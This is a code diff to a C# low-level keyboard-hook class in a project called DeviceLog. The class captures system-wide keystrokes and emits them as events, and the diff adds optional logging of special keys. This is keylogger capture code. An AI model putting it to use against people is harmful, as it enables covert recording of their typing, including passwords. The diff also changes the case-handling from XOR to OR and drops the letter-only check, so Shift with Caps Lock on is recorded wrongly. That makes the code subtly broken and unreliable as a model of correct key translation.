@@ -25,6 +25,9 @@ namespace DeviceLog.Classes.Modules.Keyboard
         [DllImport("user32.dll")]
         private static extern short GetKeyState(int nVirtKey);
 
+        [DllImport("user32.dll")]
+        private static extern short GetAsyncKeyState(int nVirtKey);
+
         [DllImport("user32.dll", SetLastError = true)]
         private static extern int GetKeyboardState(byte[] lpKeyState);
 
@@ -66,9 +69,11 @@ namespace DeviceLog.Classes.Modules.Keyboard
         internal KeyPressedEvent KeyUp;
         internal KeyPressedEvent KeyDown;
 
-        //Start hook
-        internal KeyboardHook()
+        private readonly bool _logSpecialKeys;
+
+        internal KeyboardHook(bool logSpecial)
         {
+            _logSpecialKeys = logSpecial;
         }
 
         internal void Hook()
@@ -96,12 +101,14 @@ namespace DeviceLog.Classes.Modules.Keyboard
             _isFinalized = true;
         }
 
-        //The listener that will trigger events
         private int KeybHookProc(int code, int w, ref KbdllHookStruct l)
         {
             if (code < 0) return CallNextHookEx(_hookId, code, w, ref l);
 
             KeyEvents kEvent = (KeyEvents)w;
+
+            bool isDownShift = (GetKeyState(VkShift) & 0x80) == 0x80;
+            bool isDownCapslock = GetKeyState(VkCapital) != 0;
 
             byte[] keyState = new byte[256];
             GetKeyboardState(keyState);
@@ -113,9 +120,8 @@ namespace DeviceLog.Classes.Modules.Keyboard
             if (res == 1)
             {
                 char key = sbString[0];
-                bool isDownShift = ((GetKeyState(VkShift) & 0x80) == 0x80);
-                bool isDownCapslock = (GetKeyState(VkCapital) != 0);
-                if ((isDownCapslock ^ isDownShift) && char.IsLetter(key))
+                
+                if ((isDownCapslock || isDownShift))
                 {
                     key = char.ToUpper(key);
                 }
@@ -124,24 +130,27 @@ namespace DeviceLog.Classes.Modules.Keyboard
                 
                 if (kEvent == KeyEvents.KeyDown || kEvent == KeyEvents.SKeyDown)
                 {
-                    KeyUp?.Invoke(result);
+                    KeyDown?.Invoke(result);
                 }
                 else if (kEvent == KeyEvents.KeyUp || kEvent == KeyEvents.SKeyUp)
                 {
-                    KeyDown?.Invoke(result);
+                    KeyUp?.Invoke(result);
                 }
             }
             // Key cannot be translated to unicode
             else if (res == 0)
             {
-                Keys key = (Keys)l.vkCode ;
-                if (kEvent == KeyEvents.KeyDown || kEvent == KeyEvents.SKeyDown)
+                if (_logSpecialKeys)
                 {
-                    KeyUp?.Invoke(key.ToString());
-                }
-                else if (kEvent == KeyEvents.KeyUp || kEvent == KeyEvents.SKeyUp)
-                {
-                    KeyDown?.Invoke(key.ToString());
+                    Keys key = (Keys)l.vkCode;
+                    if (kEvent == KeyEvents.KeyDown || kEvent == KeyEvents.SKeyDown)
+                    {
+                        KeyDown?.Invoke("[" + key + "]");
+                    }
+                    else if (kEvent == KeyEvents.KeyUp || kEvent == KeyEvents.SKeyUp)
+                    {
+                        KeyUp?.Invoke("[" + key + "]");
+                    }
                 }
             }
             return CallNextHookEx(_hookId, code, w, ref l);
